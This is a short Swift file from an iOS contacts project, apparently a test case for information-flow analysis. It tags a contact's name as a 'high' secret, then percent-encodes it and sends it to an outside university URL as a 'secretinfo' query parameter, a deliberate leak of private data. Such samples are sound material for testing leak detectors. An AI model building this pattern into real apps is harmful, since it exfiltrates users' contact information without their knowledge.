//
//  Main.swift
//  ContactsiOS
//
//  Created by Blake Lockley on 10/8/17.
//  Copyright © 2017 Blake Lockley. All rights reserved.
//

import Foundation
import Contacts

func main() {
    let low = "Blake" //L
    var high: String! //H

    let store = CNContactStore()
    let predicate = CNContact.predicateForContacts(matchingName: low)
    let keys = [CNContactGivenNameKey, CNContactFamilyNameKey] as [CNKeyDescriptor]

    let session = URLSession(configuration: .default)
    let prefix = "http://www.mq.edu.au/?secretinfo="

    do {
        //Result from here is a H variable
        let contacts = try store.unifiedContacts(matching: predicate, keysToFetch: keys)
        if let contact = contacts.first {
            high = "\(contact.givenName) \(contact.familyName)"
            print("Contact Found: \(high!)")
        } else {
            print("No contact found")
            return
        }
    } catch {
        print(error.localizedDescription)
        return
    }

    guard let encoded = high.addingPercentEncoding(withAllowedCharacters: .urlHostAllowed) else {
        print("Cannot encode: \(high)")
        return
    }
    let url = URL(string: prefix + encoded)!

    session.dataTask(with: url) { (_, response, _) in
        let ok = (response as? HTTPURLResponse)?.statusCode == 200
        print("HTTP Response: \(ok ? "OK" : "Failed")")
    }.resume()
}
